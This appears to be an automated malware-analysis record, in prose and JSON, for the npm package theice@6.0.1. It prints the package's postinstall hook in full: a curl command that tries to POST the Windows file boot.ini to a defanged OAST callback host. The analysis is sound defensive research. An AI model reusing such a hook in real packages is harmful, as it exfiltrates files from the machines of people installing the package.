# npm theice@6.0.1

**Source:** datadog · **Source label:** malicious · **Released:** 2025-01-28 (registry) · **Assessment:** malicious (medium) · **Analysis:** ai (claude-opus-5-5)

## Summary

The only install-time code is the `postinstall` hook, a single inline `curl -k -X POST -d '@C:\boot.ini'` to an OAST callback host (`iceice.agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com`). There are no gates: the hook runs the same way on every OS and in every environment. Because `\b` in package.json is a JSON escape for backspace, the path curl receives is not a real file, so curl sends an empty POST. The reachable effect is an install callback that reveals the installing host's IP; the intended upload of the Windows `boot.ini` file never happens.

## Execution

- **postinstall** `curl -v -k -X POST -d '@C:oot.ini' 'hxxps://iceice[.]agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com/ice' `: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: curl (The hook calls curl directly; without it the hook fails and nothing is sent.)
- network: iceice[.]agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com:443 (The POST callback goes to this host over HTTPS.)

## Behaviour

- Ungated: recon
- Gated: none

## Notes

- The tool prefilled `download_then_exec`. Changed it to `inline_shell` because the response is never run.
- Labelled `recon` rather than `exfil` because the file read cannot succeed. Flagged for review in case the dataset convention counts the attempted upload as exfil.
- `index.js` (main) only runs when the package is loaded, and typos make it throw anyway. It references a second OAST host. Not install-time.
- The package depends on itself (`theice ^6.0.1`).

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "theice",
    "version": "6.0.1",
    "archive_sha256": "1abd83ddea58d33bdea234fb007bb9ad419a21e23a1c095581f88a489562605d",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-01-28",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-01-28-theice-v6.0.1.zip",
    "package_root": "layer0/tmp/tmpx8dbpgdp/theice/package",
    "cluster_key": "16e7a0eb42547aa912a5cc3cb436d3a4f64cf236b44b394925fb451e3dae9c4f",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "postinstall",
        "command": "curl -v -k -X POST -d '@C:\boot.ini' 'hxxps://iceice[.]agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com/ice' ",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "Hook is a single inline curl POST to an OAST (Burp Collaborator style) host with TLS checks off (-k). Its response is not run, so launch_style is inline_shell, not the prefilled download_then_exec.",
      "The body is meant to be the Windows file C:\\boot.ini, but in package.json the \\b is a JSON escape for backspace, so curl gets the path 'C:<U+0008>oot.ini', which cannot exist. curl warns and sends an empty POST.",
      "So on every OS the reachable effect is an install callback to the OAST host; no file content leaves the machine. Nothing in the hook checks the environment, so there are no gates.",
      "index.js (main) is not run at install. It would run a curl and an https GET to a second OAST host when loaded, but has typos (commnd, letdata) that throw. Out of scope.",
      "package.json lists itself (theice ^6.0.1) as a dependency; no other dependencies.",
      "Behaviour is recon, not exfil: only reachable effects are listed, and no file content can be sent. The exfil intent is in assessment_reason."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "The hook calls curl directly; without it the hook fails and nothing is sent."
    },
    {
      "axis": "network",
      "value": "iceice[.]agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com:443",
      "reason": "The POST callback goes to this host over HTTPS."
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://iceice[.]agu0qxwkhz66y97desxfa4l960cr0rog[.]oastify[.]com/ice",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": "oastify install callback PoC",
  "claude_assessment": "malicious",
  "assessment_reason": "The postinstall hook POSTs to an OAST callback host on every install and tries to upload C:\\boot.ini. The JSON escape breaks the file path, so in practice only an empty callback is sent, but the intent to exfiltrate a system file from the installing machine is clear.",
  "label_disagreement": false,
  "confidence": "medium",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
